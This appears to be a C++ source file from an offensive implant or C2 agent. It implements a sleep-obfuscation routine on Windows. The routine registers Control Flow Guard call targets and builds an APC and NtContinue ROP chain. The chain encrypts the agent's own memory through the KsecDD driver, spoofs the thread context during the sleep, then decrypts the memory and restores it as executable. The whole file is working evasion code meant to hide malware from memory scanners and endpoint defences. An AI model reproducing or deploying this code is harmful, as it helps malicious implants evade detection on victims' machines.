#include "core/corelib.hpp"

BOOL AddValidCallTarget(void* pointer) {
    HEXANE

    PIMAGE_DOS_HEADER                dos_head    = { };
    PIMAGE_NT_HEADERS                nt_head     = { };
    CFG_CALL_TARGET_INFO             target_info = { };
    EXTENDED_PROCESS_INFORMATION     ex_procinfo = { };

    size_t                           length      = 0;
    bool                             success     = false;

    dos_head = P_IMAGE_DOS_HEADER(Ctx->base.address);
    nt_head  = P_IMAGE_NT_HEADERS(Ctx->base.address, dos_head);

    length   = nt_head->OptionalHeader.SizeOfImage;
    length   = (length + 0x1000 - 1) &~ (0x1000 - 1);

    ex_procinfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
    ex_procinfo.ExtendedProcessInfoBuffer = 0;

    if (NT_SUCCESS(ntstatus = Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, (ProcessCookie | ProcessUserModeIOPL)), &ex_procinfo, sizeof(ex_procinfo ), nullptr))) {
        target_info.Flags  = CFG_CALL_TARGET_VALID;
        target_info.Offset = U_PTR(pointer) - U_PTR(Ctx->base.address);

        auto base = Ctx->base.address;
        if (Ctx->nt.SetProcessValidCallTargets(NtCurrentProcess(), &base, length, 1, &target_info)) {
            success_(true);
        }
    }

    defer:
    return success;
}

BOOL ObfuscateSleep(PCONTEXT FakeFrame, PLARGE_INTEGER Timeout) {
    HEXANE

    HANDLE              rop_thread      = { };
    HANDLE              src_thread      = { };
    HANDLE              sync_event      = { };
    HANDLE              ksecdd          = { };

    PWCHAR              ksecdd_name     = { };
    CLIENT_ID           src_cid         = { };
    UNICODE_STRING      src_uni         = { };
    IO_STATUS_BLOCK     ksecdd_iostat   = { };
    OBJECT_ATTRIBUTES   src_object      = { };
    OBJECT_ATTRIBUTES   sec_object      = { };

    ULONG               success_count   = 0;

    PCONTEXT          rop_buffer = { };
    PCONTEXT          ContextRopExt = { };
    PCONTEXT          ContextRopDel = { };
    PCONTEXT          ContextRopSet = { };
    PCONTEXT          ContextRopRes = { };
    PCONTEXT          ContextRopEnc = { };
    PCONTEXT          ContextRopDec = { };
    PCONTEXT          ContextStolen = { };

    PVOID             ContextMemPtr = { };
    SIZE_T            ContextMemLen = 0;
    ULONG             ContextMemPrt = 0;

    PVOID             ContextResPtr = { };
    SIZE_T            ContextResLen = 0;
    ULONG             ContextResPrt = 0;

    PCONTEXT          ContextCtxCap = { };
    PCONTEXT          ContextCapMem = { };
    PCONTEXT          ContextCtxSet = { };
    PCONTEXT          ContextCtxRes = { };

    ContextMemPtr = C_PTR(Ctx->base.address);
    ContextMemLen = Ctx->base.size;

    ContextResPtr = C_PTR(Ctx->base.address);
    ContextResLen = Ctx->base.size;

    AddValidCallTarget(C_PTR(Ctx->nt.ExitThread));
    AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
    AddValidCallTarget(C_PTR(Ctx->nt.NtTestAlert));
    AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution));
    AddValidCallTarget(C_PTR(Ctx->nt.NtGetContextThread));
    AddValidCallTarget(C_PTR(Ctx->nt.NtSetContextThread));
    AddValidCallTarget(C_PTR(Ctx->nt.NtWaitForSingleObject));
    AddValidCallTarget(C_PTR(Ctx->nt.NtDeviceIoControlFile));
    AddValidCallTarget(C_PTR(Ctx->nt.NtProtectVirtualMemory));

    src_object.Length = sizeof( src_object );
    sec_object.Length = sizeof( sec_object );

    ksecdd_name = OBFW(L"\\Device\\KsecDD");

    Ctx->nt.RtlInitUnicodeString( &src_uni, ksecdd_name );
    InitializeObjectAttributes( &sec_object, &src_uni, 0, 0, NULL );

    ntstatus = Ctx->nt.NtOpenFile(&ksecdd, SYNCHRONIZE | FILE_READ_DATA, &sec_object, &ksecdd_iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0);

    src_cid.UniqueProcess = 0;
    src_cid.UniqueThread  = NtCurrentTeb()->ClientId.UniqueThread;

    ntstatus = Ctx->nt.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid);
    ntstatus = Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( FakeFrame->Rip ), NULL, TRUE, 0, 0xFFFF, 0xFFFF, NULL);
    ntstatus = Ctx->nt.NtCreateEvent(&sync_event, EVENT_ALL_ACCESS, NULL, 1, FALSE);

    ContextStolen = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    ContextStolen->ContextFlags = CONTEXT_FULL;
    ntstatus = Ctx->nt.NtGetContextThread(rop_thread, ContextStolen);

    rop_buffer = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

#if defined( _WIN64 )
    *rop_buffer = *ContextStolen;
    rop_buffer->ContextFlags = CONTEXT_FULL;
    rop_buffer->Rsp = U_PTR( ContextStolen->Rsp );
    rop_buffer->Rip = U_PTR( Ctx->nt.NtWaitForSingleObject );
    rop_buffer->Rcx = U_PTR( sync_event );
    rop_buffer->Rdx = U_PTR( FALSE );
    rop_buffer->R8  = U_PTR( NULL );
    *( uintptr_t * )( rop_buffer->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
#else
    *rop_buffer = *ContextStolen;
	rop_buffer->ContextFlags = CONTEXT_FULL;
	rop_buffer->Esp = U_PTR( ContextStolen->Esp - 0x100 );
	rop_buffer->Eip = U_PTR( Ctx->nt.NtWaitForSingleObject );
	*( uintptr_t * )( rop_buffer->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;

	// insert argument chain here
#endif

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_buffer, NULL, NULL);
    ContextRopSet = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextRopSet = *ContextStolen;
    ContextRopSet->ContextFlags = CONTEXT_FULL;
    ContextRopSet->Rsp = U_PTR( ContextStolen->Rsp - 0x1000 );
    ContextRopSet->Rip = U_PTR( Ctx->nt.NtProtectVirtualMemory );
    ContextRopSet->Rcx = U_PTR( NtCurrentProcess() );
    ContextRopSet->Rdx = U_PTR( &ContextMemPtr );
    ContextRopSet->R8  = U_PTR( &ContextMemLen );
    ContextRopSet->R9  = U_PTR( PAGE_READWRITE );
    *( uintptr_t *)( ContextRopSet->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
    *( uintptr_t *)( ContextRopSet->Rsp + 0x28 ) = ( uintptr_t ) &ContextMemPrt;

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopSet, NULL, NULL);
    ContextRopEnc = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextRopEnc = *ContextStolen;
    ContextRopEnc->ContextFlags = CONTEXT_FULL;
    ContextRopEnc->Rsp = U_PTR( ContextStolen->Rsp - 0x2000 );
    ContextRopEnc->Rip = U_PTR( Ctx->nt.NtDeviceIoControlFile );
    ContextRopEnc->Rcx = U_PTR( ksecdd );
    ContextRopEnc->Rdx = U_PTR( NULL );
    ContextRopEnc->R8  = U_PTR( NULL );
    ContextRopEnc->R9  = U_PTR( NULL );
    *( uintptr_t *)( ContextRopEnc->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
    *( uintptr_t *)( ContextRopEnc->Rsp + 0x28 ) = ( uintptr_t ) &ksecdd_iostat;
    *( uintptr_t *)( ContextRopEnc->Rsp + 0x30 ) = ( uintptr_t ) IOCTL_KSEC_ENCRYPT_MEMORY;
    *( uintptr_t *)( ContextRopEnc->Rsp + 0x38 ) = ( uintptr_t ) ContextMemPtr;
    *( uintptr_t *)( ContextRopEnc->Rsp + 0x40 ) = ( uintptr_t ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
    *( uintptr_t *)( ContextRopEnc->Rsp + 0x48 ) = ( uintptr_t ) ContextMemPtr;
    *( uintptr_t *)( ContextRopEnc->Rsp + 0x50 ) = ( uintptr_t ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopEnc, NULL, NULL);
    ContextCtxCap = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
    ContextCapMem = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextCtxCap = *ContextStolen;
    ContextCapMem->ContextFlags = CONTEXT_FULL;
    ContextCtxCap->ContextFlags = CONTEXT_FULL;
    ContextCtxCap->Rsp = U_PTR( ContextStolen->Rsp );
    ContextCtxCap->Rip = U_PTR( Ctx->nt.NtGetContextThread );
    ContextCtxCap->Rcx = U_PTR( src_thread );
    ContextCtxCap->Rdx = U_PTR( ContextCapMem );
    *( uintptr_t *)( ContextCtxCap->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxCap, NULL, NULL);
    ContextCtxSet = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextCtxSet = *ContextStolen;
    ContextCtxSet->ContextFlags = CONTEXT_FULL;
    ContextCtxSet->Rsp = U_PTR( ContextStolen->Rsp );
    ContextCtxSet->Rip = U_PTR( Ctx->nt.NtSetContextThread );
    ContextCtxSet->Rcx = U_PTR( src_thread );
    ContextCtxSet->Rdx = U_PTR( FakeFrame );
    *( uintptr_t *)( ContextCtxSet->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxSet, NULL, NULL);
    ContextRopDel = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

//
// WAIT FUNCTION GOES HERE
//

//
// Swap this with NtWaitForSingleObject
// for practicality purposes so that
// we can use it on objects.
//

    *ContextRopDel = *ContextStolen;
    ContextRopDel->ContextFlags = CONTEXT_FULL;
    ContextRopDel->Rsp = U_PTR( ContextStolen->Rsp );
    ContextRopDel->Rip = U_PTR( Ctx->nt.NtDelayExecution );
    ContextRopDel->Rcx = U_PTR( FALSE );
    ContextRopDel->Rdx = U_PTR( Timeout );
    *( uintptr_t *)( ContextRopDel->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDel, NULL, NULL);

//
// WAIT FUNCTION ENDS HERE
//

    ContextRopDec = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextRopDec = *ContextStolen;
    ContextRopDec->ContextFlags = CONTEXT_FULL;
    ContextRopDec->Rsp = U_PTR( ContextStolen->Rsp - 0x3000 );
    ContextRopDec->Rip = U_PTR( Ctx->nt.NtDeviceIoControlFile );
    ContextRopDec->Rcx = U_PTR( ksecdd );
    ContextRopDec->Rdx = U_PTR( NULL );
    ContextRopDec->R8  = U_PTR( NULL );
    ContextRopDec->R9  = U_PTR( NULL );

    *(uintptr_t*)(ContextRopDec->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x28) = (uintptr_t) &ksecdd_iostat;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_DECRYPT_MEMORY;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x38) = (uintptr_t) ContextMemPtr;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x40) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
    *(uintptr_t*)(ContextRopDec->Rsp + 0x48) = (uintptr_t) ContextMemPtr;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x50) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDec, NULL, NULL);
    ContextCtxRes = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextCtxRes = *ContextStolen;
    ContextCtxRes->ContextFlags = CONTEXT_FULL;
    ContextCtxRes->Rsp = U_PTR( ContextStolen->Rsp );
    ContextCtxRes->Rip = U_PTR( Ctx->nt.NtSetContextThread );
    ContextCtxRes->Rcx = U_PTR( src_thread );
    ContextCtxRes->Rdx = U_PTR( ContextCapMem );
    *( uintptr_t *)( ContextCtxRes->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxRes, NULL, NULL);
    ContextRopRes = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextRopRes = *ContextStolen;
    ContextRopRes->ContextFlags = CONTEXT_FULL;
    ContextRopRes->Rsp = U_PTR( ContextStolen->Rsp - 0x1000 );
    ContextRopRes->Rip = U_PTR( Ctx->nt.NtProtectVirtualMemory );
    ContextRopRes->Rcx = U_PTR( NtCurrentProcess() );
    ContextRopRes->Rdx = U_PTR( &ContextResPtr );
    ContextRopRes->R8  = U_PTR( &ContextResLen );
    ContextRopRes->R9  = U_PTR( PAGE_EXECUTE_READWRITE );
    *( uintptr_t *)( ContextRopRes->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert ;
    *( uintptr_t *)( ContextRopRes->Rsp + 0x28 ) = ( uintptr_t ) &ContextResPrt;

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopRes, NULL, NULL);
    ContextRopExt = NtMemAlloc( Ctx, sizeof( CONTEXT ) );

    *ContextRopExt = *ContextStolen;
    ContextRopExt->ContextFlags = CONTEXT_FULL;
    ContextRopExt->Rsp = U_PTR( ContextStolen->Rsp );
    ContextRopExt->Rip = U_PTR( Ctx->nt.ExitThread );
    ContextRopExt->Rcx = U_PTR( NULL );
    *( uintptr_t *)( ContextRopExt->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;

    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopExt, NULL, NULL);
    ntstatus = Ctx->nt.NtAlertResumeThread(rop_thread, &success_count);

    ntstatus = Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, TRUE, NULL);

    END_ROP_CHAIN:
    if ( ContextRopDec ) { NtMemFree( Ctx, ContextRopDec ); };
    if ( ContextRopEnc ) { NtMemFree( Ctx, ContextRopEnc ); };
    if ( ContextCtxRes ) { NtMemFree( Ctx, ContextCtxRes ); };
    if ( ContextCtxSet ) { NtMemFree( Ctx, ContextCtxSet ); };
    if ( ContextCtxCap ) { NtMemFree( Ctx, ContextCtxCap ); };
    if ( ContextCapMem ) { NtMemFree( Ctx, ContextCapMem ); };
    if ( ContextRopRes ) { NtMemFree( Ctx, ContextRopRes ); };
    if ( ContextRopSet ) { NtMemFree( Ctx, ContextRopSet ); };
    if ( ContextRopDel ) { NtMemFree( Ctx, ContextRopDel ); };
    if ( rop_buffer ) { NtMemFree( Ctx, rop_buffer ); };
    if ( ContextRopExt ) { NtMemFree( Ctx, ContextRopExt ); };
    if ( ContextStolen ) { NtMemFree( Ctx, ContextStolen ); };

    if ( rop_thread ) { Ctx->nt.NtTerminateThread( rop_thread, STATUS_SUCCESS );
        Ctx->nt.NtClose( rop_thread );
    };
    if ( src_thread ) { Ctx->nt.NtClose( src_thread ); };
    if ( sync_event ) { Ctx->nt.NtClose( sync_event ); };
    if ( ksecdd ) { Ctx->nt.NtClose( ksecdd ); };

    return ntstatus;
};